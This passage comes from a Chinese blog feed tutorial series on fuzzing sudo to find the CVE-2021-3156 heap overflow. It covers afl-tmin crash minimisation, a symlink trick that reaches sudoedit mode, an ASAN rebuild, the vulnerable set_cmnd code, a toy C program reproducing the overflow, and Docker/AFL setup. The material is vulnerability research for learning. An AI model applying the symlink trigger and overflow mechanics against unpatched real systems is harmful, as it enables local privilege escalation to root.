简化crash</h2><p>其实我做到这一步想到的是用<code>afl-tmin</code>，后来发现作者尝试其他方案失败后，我就直接用<code>afl-tmin</code>了</p><p><img src="https://img.joe1sn.top/uploads/big/ede57706c88ad393445a59251320c6ca.png" alt="image-20220413172941195" /></p><p>在<code>user</code>下检验</p><ol><li><p>创建软链接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /usr/local/bin/sudo 0edit</span><br><span class="line">ls -lah 0edit</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/13d1cf086fed8c1a09c80748979f0f49.png" alt="image-20220413173329188" /></p></li><li><p>运行测试</p><p><img src="https://img.joe1sn.top/uploads/big/0c4c5b99c28011c3f51f2dcdcd33100e.png" alt="image-20220413173442633" /></p></li><li><p>有趣的发现</p><p><img src="https://img.joe1sn.top/uploads/big/398330becbcf7f97e12da43098b9a277.png" alt="image-20220413174215939" /></p><p>结尾是<code>xedit</code>这种形式就可以调用<code>sudoedit</code></p></li></ol><h2 id="使用asan分析漏洞"><a class="markdownIt-Anchor" href="#使用asan分析漏洞"></a> 使用ASAN分析漏洞</h2><p>asan一直是一个很操蛋的工具，经常报错，作者也在这里报错很多，我也是直接展示正常（正常报错）做法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make clean &amp;&amp; ./configure CFLAGS=&quot;-fsanitize=address,undefined -g&quot; LDFLAGS=&quot;-fsanitize=address,undefined&quot; CC=clang --disable-shared &amp;&amp; make -j8</span><br></pre></td></tr></table></figure><p>送入mini_crash样例检测</p><p><img src="https://img.joe1sn.top/uploads/big/11df8269329c22ceab581946fa93e0eb.png" alt="image-20220413175350857" /></p><p>如果没有加上<code>--disable-shared</code>的话，就算有<code>-g</code>参数，也不会知道具体代码在哪里</p><p>现在我们知道漏洞的位置在<code>/plugins/sudoers/./sudoers.c:868</code>的<code>set_cmnd</code>函数内</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">set_cmnd</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sudo_nss</span> *<span class="title">nss</span>;</span></span><br><span class="line">    <span class="type">char</span> *path = user_path;</span><br><span class="line">    <span class="type">int</span> ret = FOUND;</span><br><span class="line">    debug_decl(set_cmnd, SUDOERS_DEBUG_PLUGIN)</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Allocate user_stat for find_path() and match functions. */</span></span><br><span class="line">    user_stat = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> stat));</span><br><span class="line">    <span class="keyword">if</span> (user_stat == <span class="literal">NULL</span>) &#123;</span><br><span class="line">sudo_warnx(U_(<span class="string">&quot;%s: %s&quot;</span>), __func__, U_(<span class="string">&quot;unable to allocate memory&quot;</span>));</span><br><span class="line">debug_return_int(NOT_FOUND_ERROR);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Default value for cmnd, overridden below. */</span></span><br><span class="line">    <span class="keyword">if</span> (user_cmnd == <span class="literal">NULL</span>)</span><br><span class="line">user_cmnd = NewArgv[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sudo_mode &amp; (MODE_RUN | MODE_EDIT | MODE_CHECK)) &#123;</span><br><span class="line"><span class="keyword">if</span> (ISSET(sudo_mode, MODE_RUN | MODE_CHECK)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (def_secure_path &amp;&amp; !user_is_exempt())</span><br><span class="line">path = def_secure_path;</span><br><span class="line">    <span class="keyword">if</span> (!set_perms(PERM_RUNAS))</span><br><span class="line">debug_return_int(<span class="number">-1</span>);</span><br><span class="line">    ret = find_path(NewArgv[<span class="number">0</span>], &amp;user_cmnd, user_stat, path,</span><br><span class="line">def_ignore_dot, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!restore_perms())</span><br><span class="line">debug_return_int(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> (ret == NOT_FOUND) &#123;</span><br><span class="line"><span class="comment">/* Failed as root, try as invoking user. */</span></span><br><span class="line"><span class="keyword">if</span> (!set_perms(PERM_USER))</span><br><span class="line">    debug_return_int(<span class="number">-1</span>);</span><br><span class="line">ret = find_path(NewArgv[<span class="number">0</span>], &amp;user_cmnd, user_stat, path,</span><br><span class="line">    def_ignore_dot, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (!restore_perms())</span><br><span class="line">    debug_return_int(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (ret == NOT_FOUND_ERROR) &#123;</span><br><span class="line"><span class="keyword">if</span> (errno == ENAMETOOLONG)</span><br><span class="line">    audit_failure(NewArgc, NewArgv, N_(<span class="string">&quot;command too long&quot;</span>));</span><br><span class="line">log_warning(<span class="number">0</span>, <span class="string">&quot;%s&quot;</span>, NewArgv[<span class="number">0</span>]);</span><br><span class="line">debug_return_int(ret);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* set user_args */</span></span><br><span class="line"><span class="keyword">if</span> (NewArgc &gt; <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="type">char</span> *to, *from, **av;</span><br><span class="line">    <span class="type">size_t</span> size, n;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Alloc and build up user_args. */</span></span><br><span class="line">    <span class="keyword">for</span> (size = <span class="number">0</span>, av = NewArgv + <span class="number">1</span>; *av; av++)</span><br><span class="line">size += <span class="built_in">strlen</span>(*av) + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (size == <span class="number">0</span> || (user_args = <span class="built_in">malloc</span>(size)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">sudo_warnx(U_(<span class="string">&quot;%s: %s&quot;</span>), __func__, U_(<span class="string">&quot;unable to allocate memory&quot;</span>));</span><br><span class="line">debug_return_int(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * When running a command via a shell, the sudo front-end</span></span><br><span class="line"><span class="comment"> * escapes potential meta chars.  We unescape non-spaces</span></span><br><span class="line"><span class="comment"> * for sudoers matching and logging purposes.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">for</span> (to = user_args, av = NewArgv + <span class="number">1</span>; (from = *av); av++) &#123;</span><br><span class="line">    <span class="keyword">while</span> (*from) &#123;</span><br><span class="line"><span class="keyword">if</span> (from[<span class="number">0</span>] == <span class="string">&#x27;\\&#x27;</span> &amp;&amp; !<span class="built_in">isspace</span>((<span class="type">unsigned</span> <span class="type">char</span>)from[<span class="number">1</span>]))</span><br><span class="line">    from++;</span><br><span class="line">*to++ = *from++;</span><br><span class="line">    &#125;</span><br><span class="line">    *to++ = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">*--to = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (to = user_args, av = NewArgv + <span class="number">1</span>; *av; av++) &#123;</span><br><span class="line">    n = strlcpy(to, *av, size - (to - user_args));</span><br><span class="line">    <span class="keyword">if</span> (n &gt;= size - (to - user_args)) &#123;</span><br><span class="line">sudo_warnx(U_(<span class="string">&quot;internal error, %s overflow&quot;</span>), __func__);</span><br><span class="line">debug_return_int(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    to += n;</span><br><span class="line">    *to++ = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">*--to = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((user_base = <span class="built_in">strrchr</span>(user_cmnd, <span class="string">&#x27;/&#x27;</span>)) != <span class="literal">NULL</span>)</span><br><span class="line">user_base++;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">user_base = user_cmnd;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Convert &quot;sudo sudoedit&quot; -&gt; &quot;sudoedit&quot; */</span></span><br><span class="line">    <span class="keyword">if</span> (ISSET(sudo_mode, MODE_RUN) &amp;&amp; <span class="built_in">strcmp</span>(user_base, <span class="string">&quot;sudoedit&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">CLR(sudo_mode, MODE_RUN);</span><br><span class="line">SET(sudo_mode, MODE_EDIT);</span><br><span class="line">sudo_warnx(U_(<span class="string">&quot;sudoedit doesn&#x27;t need to be run via sudo&quot;</span>));</span><br><span class="line">user_base = user_cmnd = <span class="string">&quot;sudoedit&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    TAILQ_FOREACH(nss, snl, entries) &#123;</span><br><span class="line"><span class="keyword">if</span> (!update_defaults(nss-&gt;parse_tree, <span class="literal">NULL</span>, SETDEF_CMND, <span class="literal">false</span>)) &#123;</span><br><span class="line">    log_warningx(SLOG_SEND_MAIL|SLOG_NO_STDERR,</span><br><span class="line">N_(<span class="string">&quot;problem with defaults entries&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    debug_return_int(ret);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞造成的原因在<a href="https://blog.joe1sn.top/2022/04/11/sudo-fuzz2exp-1/">CVE那篇文章</a>分析过了</p><h1 id="简化漏洞模型"><a class="markdownIt-Anchor" href="#简化漏洞模型"></a> 简化漏洞模型</h1><p>这里的视角更像是给CTF出题，我也确实一句这个漏洞出过一道，不过在这里我们后面会完成exp的编写，所以只写c程序分析就行了</p><p>精简一下上面的源代码，问题出现在这里</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123;</span><br><span class="line">    <span class="keyword">for</span> (to = user_args, av = NewArgv + <span class="number">1</span>; (from = *av); av++) &#123;</span><br><span class="line">        <span class="keyword">while</span> (*from) &#123;</span><br><span class="line">        <span class="keyword">if</span> (from[<span class="number">0</span>] == <span class="string">&#x27;\\&#x27;</span> &amp;&amp; !<span class="built_in">isspace</span>((<span class="type">unsigned</span> <span class="type">char</span>)from[<span class="number">1</span>]))</span><br><span class="line">            from++;</span><br><span class="line">        *to++ = *from++;</span><br><span class="line">        &#125;</span><br><span class="line">        *to++ = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *--to = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>如果最后一个参数是<code>\</code>的话，<code>from++</code>，</li><li>然后<code>*to++ = *from++</code>，此时的<code>from</code>指针就超出了边界，造成堆溢出</li></ul><p>可以写一个小的例子调试一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> from[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;please input some data, max is 100&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,from,<span class="number">100</span>);</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(from);</span><br><span class="line">    </span><br><span class="line">    <span class="type">char</span> *src = from;</span><br><span class="line">    <span class="type">char</span> *to = (<span class="type">char</span> *)<span class="built_in">malloc</span>(len);</span><br><span class="line">    <span class="type">char</span> *dst = to+<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;start copy file&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(*src)&#123;</span><br><span class="line">        <span class="keyword">if</span> (src[<span class="number">0</span>] == <span class="string">&#x27;\\&#x27;</span> &amp;&amp; !<span class="built_in">isspace</span>((<span class="type">unsigned</span> <span class="type">char</span>)src[<span class="number">1</span>]))</span><br><span class="line">            src++;</span><br><span class="line">        *dst++ = *src++;</span><br><span class="line">    &#125;</span><br><span class="line">    *to++ = <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;src&gt; %s&quot;</span>,from);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;dst&gt; %s&quot;</span>,to);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造这样的特殊输入，<strong>在输入的时候已经输入0x18个字符串了</strong>，所以是<code>malloc(0x18)</code></p><p><img src="https://img.joe1sn.top/uploads/big/b9648613040076eb566c77966dea5d67.png" alt="image-20220413183616868" /></p><p>按照程序的效果，会将下一个<code>chunk</code>的头部份覆写为<code>0xbbbbbbbb</code></p><p><img src="https://img.joe1sn.top/uploads/big/7ad96585e880f07ad0daed331805901a.png" alt="image-20220413183740441" /></p><p>成功覆盖掉，实现预期堆溢出的目标，<strong>说明当结尾的反斜杠后面还有数据的时候会产生堆溢出</strong></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;sudo堆溢出提权从fuzz到exp-2&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#sudo堆溢出提权从fuzz到exp-2&quot;&gt;&lt;/a&gt; SUDO堆溢出提权：从fuzz到exp [2]&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;前文：&lt;a href=&quot;https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/&quot;&gt;https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;受到youtuber：LiveOverflow的系列教程的启发，我发现在中文互联网上并没有相关的翻译教程，所以我想以实验报告的形式来创造这个从fuzz到exp的系列图文教程&lt;/p&gt;
&lt;p&gt;原始视频合集：&lt;a href=&quot;https://www.youtube.com/watch?v=uj1FTiczJSE&amp;amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx&quot;&gt;https://www.youtube.com/watch?v=uj1FTiczJSE&amp;amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;原始Blog：&lt;a href=&quot;https://liveoverflow.com/why-pick-sudo-research-target-part-1/&quot;&gt;https://liveoverflow.com/why-pick-sudo-research-target-part-1/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;原作者代码仓库：&lt;a href=&quot;https://github.com/LiveOverflow/pwnedit&quot;&gt;https://github.com/LiveOverflow/pwnedit&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="CVE" scheme="https://joe1sn.eu.org/categories/CVE/"/>
    
    
    <category term="CVE" scheme="https://joe1sn.eu.org/tags/CVE/"/>
    
    <category term="fuzz" scheme="https://joe1sn.eu.org/tags/fuzz/"/>
    
  </entry>
  
  <entry>
    <title>SUDO堆溢出提权：从fuzz到exp [1]</title>
    <link href="https://joe1sn.eu.org/2022/04/11/sudo-fuzz2exp-1/"/>
    <id>https://joe1sn.eu.org/2022/04/11/sudo-fuzz2exp-1/</id>
    <published>2022-04-11T02:40:44.000Z</published>
    <updated>2022-09-20T08:04:28.420Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sudo堆溢出提权从fuzz到exp-1"><a class="markdownIt-Anchor" href="#sudo堆溢出提权从fuzz到exp-1"></a> SUDO堆溢出提权：从fuzz到exp [1]</h1><blockquote><p>前文：<a href="https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/">https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/</a></p><p>受到youtuber：LiveOverflow的系列教程的启发，我发现在中文互联网上并没有相关的翻译教程，所以我想以实验报告的形式来创造这个从fuzz到exp的系列图文教程</p><p>原始视频合集：<a href="https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx">https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx</a></p><p>原始Blog：<a href="https://liveoverflow.com/why-pick-sudo-research-target-part-1/">https://liveoverflow.com/why-pick-sudo-research-target-part-1/</a></p><p>原作者代码仓库：<a href="https://github.com/LiveOverflow/pwnedit">https://github.com/LiveOverflow/pwnedit</a></p></blockquote><span id="more"></span><blockquote><p>My previous blog: <a href="https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/">https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/</a></p><p>I was inspired by the LiveOverflow’s Sudo Vulnerability Walkthrough on youtube, but i found there’s no Chinese version of this walkthrough tutorial, so i decided to write in experimental report way to create this “from fuzz to exploit” series.</p><p>Original Videos: <a href="https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx">https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx</a></p><p>Original Blog: <a href="https://liveoverflow.com/why-pick-sudo-research-target-part-1/">https://liveoverflow.com/why-pick-sudo-research-target-part-1/</a></p><p>Source Project Code: <a href="https://github.com/LiveOverflow/pwnedit">https://github.com/LiveOverflow/pwnedit</a></p></blockquote><hr /><blockquote><p>本节内容：</p><p>Why Pick sudo as Research Target? | Ep. 01</p><p>How Fuzzing with AFL works! | Ep. 02</p></blockquote><h1 id="环境搭建"><a class="markdownIt-Anchor" href="#环境搭建"></a> 环境搭建</h1><p>在最开始的<a href="https://github.com/LiveOverflow/pwnedit">复现博客</a>中，我最初打算在docker中搭建整个项目，但是由于在docker上exp需要微调和学业压力导致我并不能花太多时间在上面，所以我直接使用的虚拟机。不过在原始的备份文档中我依然保存了当时搭建docker的记录，这里和原作者使用的方法类似.</p><img src="https://img.joe1sn.top/uploads/big/f302c3d5fd27620789f4e5d42a90a000.png" alt="image-20220411105826186" style="zoom:50%;" /><h2 id="docker"><a class="markdownIt-Anchor" href="#docker"></a> Docker</h2><p>LiveOverflow在项目的git仓库中有了这个dockerfile文件。因为中国GFW，所以我换了下源，如果不需要可以删掉。我这里用的是windows的DesktopDocker搭建</p><p><code>ep1\Dockerfile</code></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">20.04</span></span><br><span class="line"><span class="keyword">ENV</span> LC_CTYPE C.UTF-<span class="number">8</span></span><br><span class="line"><span class="keyword">ARG</span> DEBIAN_FRONTEND=noninteractive</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i <span class="string">&#x27;s/archive.ubuntu.com/mirrors.aliyun.com/g&#x27;</span> /etc/apt/sources.list &amp;&amp;\</span></span><br><span class="line"><span class="language-bash">    apt-get update &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get install -yq gcc make wget curl git vim gdb clang llvm python3 python3-pip bsdmainutils</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">cd</span> /root/ &amp;&amp; wget https://www.sudo.ws/dist/sudo-1.8.31p2.tar.gz &amp;&amp; tar -xvf sudo-1.8.31p2.tar.gz &amp;&amp; <span class="built_in">cd</span> sudo-1.8.31p2 &amp;&amp; ./configure &amp;&amp; make &amp;&amp; make install</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">cd</span> /root/ &amp;&amp; git <span class="built_in">clone</span> https://github.com/google/AFL &amp;&amp; <span class="built_in">cd</span> AFL &amp;&amp; make &amp;&amp; <span class="built_in">cd</span> llvm_mode &amp;&amp; make &amp;&amp; <span class="built_in">cd</span> .. &amp;&amp; make install</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> useradd -ms /bin/bash user</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&#x27;export PS1=&quot;\[\e]0;\u@\h: \w\a\]\[\033[01;31m\]\u\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]# &quot;&#x27;</span> &gt;&gt; /root/.bashrc</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&#x27;export PS1=&quot;\[\e]0;\u@\h: \w\a\]\[\033[01;32m\]\u\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]$ &quot;&#x27;</span> &gt;&gt; /home/user/.bashrc</span></span><br><span class="line"><span class="keyword">USER</span> <span class="keyword">user</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /home/user</span></span><br></pre></td></tr></table></figure><p>从 <strong>ubuntu20.04</strong> 的基础镜像中，设置编码为 <strong>ENV LC_CTYPE C.UTF-8</strong>，设置非交互式操作(<strong>ARG DEBIAN_FRONTEND=noninteractive</strong>)，升级源并安装必要的编译运行环境，之后下载有漏洞的 <strong>sudoedit</strong> 源代码编译安装。</p><p>之后在该docker中安装 <strong>AFL(American Fuzzy Lop)</strong> 的模糊测试软件，添加普通用户 <strong>user</strong>，最后修改命令提示符的界面美化一下并设置工作目录</p><p>你可以使用<code>docker build . -t sudo1</code>来创建docker，但是同时作者编写了一个makefile来方便管理</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.PHONY : all stop build run attach root</span><br><span class="line">all : stop build run</span><br><span class="line"></span><br><span class="line"><span class="section">stop:</span></span><br><span class="line">-docker stop sudo1</span><br><span class="line">sleep 1</span><br><span class="line">-docker rmi sudo1</span><br><span class="line"></span><br><span class="line"><span class="section">build:</span></span><br><span class="line">docker build --no-cache -t sudo1 .</span><br><span class="line"></span><br><span class="line"><span class="section">run:</span></span><br><span class="line">docker run --rm -v <span class="variable">$(CURDIR)</span>:/pwd --cap-add=SYS_PTRACE --security-opt seccomp=unconfined -d --name sudo1 -i sudo1</span><br><span class="line"></span><br><span class="line"><span class="section">attach:</span></span><br><span class="line">docker exec -it sudo1 /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="section">root:</span></span><br><span class="line">docker exec -u root -it sudo1 /bin/bash</span><br></pre></td></tr></table></figure><p>在<code>make run</code>的时候设置了<code>-v $(CURDIR):/pwd</code>参数可以让该目录下的文件同样位于在docker中的<code>/pwd</code>中，但是由于我使用的是DesktopDocker+VsCode(Docker plugin)，对我来说不是很必要</p><p>所以可以<code>make</code>或者<code>make build</code>来创建docker</p><p><img src="https://img.joe1sn.top/uploads/big/450908d4f64d32270280ba5fb238de54.png" alt="image-20220411114503969" /></p><p>&gt;&gt;遇到的问题</p><ul><li><p>ERROR [4/8] RUN cd /root/ &amp;&amp; git clone <a href="https://github.com/google/AFL">https://github.com/google/AFL</a> &amp;&amp; cd AFL &amp;&amp; make &amp;&amp; make install</p><p>中国大陆网络屏蔽了github，导致其无法git仓库，可以挂代理，或者在docker创建好过后再利用<code>pwd</code>文件夹放入afl</p></li><li><p>docker搭建时间长</p><p>正常现象，更新下载的时间有点长，这取决于网速</p></li></ul><p><img src="https://img.joe1sn.top/uploads/big/768801bd3a1149d8f0edea6cb2b7643c.png" alt="image-20220411151848563" /></p><p>创建容器<code>make run</code></p><p>创建完成后使用<code>make attach</code>进入docker</p><p><img src="https://img.joe1sn.top/uploads/big/690559ec63975ea95406d03d0b53c308.png" alt="image-20220411151953764" /></p><p><img src="https://img.joe1sn.top/uploads/big/c0585fb3bab085a968526cfe3eb7a70c.png" alt="image-20220411152135747" /></p><h2 id="afl"><a class="markdownIt-Anchor" href="#afl"></a> AFL</h2><p>项目链接：<a href="https://lcamtuf.coredump.cx/afl/">https://lcamtuf.coredump.cx/afl/</a></p><blockquote><p><em>American fuzzy lop</em> is a security-oriented <a href="https://en.wikipedia.org/wiki/Fuzz_testing">fuzzer</a> that employs a novel type of compile-time instrumentation and genetic algorithms to automatically discover clean, interesting test cases that trigger new internal states in the targeted binary. This substantially improves the functional coverage for the fuzzed code. The compact <a href="https://lcamtuf.coredump.cx/afl/demo/">synthesized corpora</a> produced by the tool are also useful for seeding other, more labor- or resource-intensive testing regimes down the road.</p></blockquote><hr /><p><strong>编译安装AFL</strong></p><p>这里我是去掉git afl的，所以后来要装上</p><p><img src="https://img.joe1sn.top/uploads/big/428007e38a5a746d930318b906a62cea.png" alt="image-20220411152517640" /><strong>问题：权限不够</strong></p><ul><li>以<code>docker exec -it -u root ContainerID /bin/bash</code>进入，然后编译安装afl就行了</li></ul><h1 id="开始fuzz"><a class="markdownIt-Anchor" href="#开始fuzz"></a> 开始FUZZ</h1><h2 id="afl编译sudo"><a class="markdownIt-Anchor" href="#afl编译sudo"></a> 